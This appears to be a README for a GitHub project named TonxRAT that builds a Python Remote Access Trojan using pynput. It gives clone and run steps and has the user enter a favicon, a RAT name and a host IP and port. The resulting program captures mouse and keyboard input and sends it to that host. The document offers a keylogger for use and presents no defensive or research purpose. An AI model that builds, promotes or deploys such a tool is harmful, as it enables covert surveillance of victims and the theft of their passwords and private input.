# Rat Builder

This project creates a RAT (Remote Access Trojan) using Python and pynput libraries.

## Installation

First, you need to have the following packages installed:
- Python: [Download link](https://www.python.org/downloads/)
- pynput: `pip install pynput`

After installing Python and pynput, clone this repository:

```
git clone https://github.com/Anton-ai111/TonxRAT-v1.git
```

## Usage

1. Run the script with Python:
```bash
python rat_builder.py
```

2. Enter your information when prompted:
   - Favicon (without .ico extension)
   - RAT name
   - Target host IP address
   - Target port number

3. The RAT will start listening for mouse and keyboard input, sending the data to the specified host.
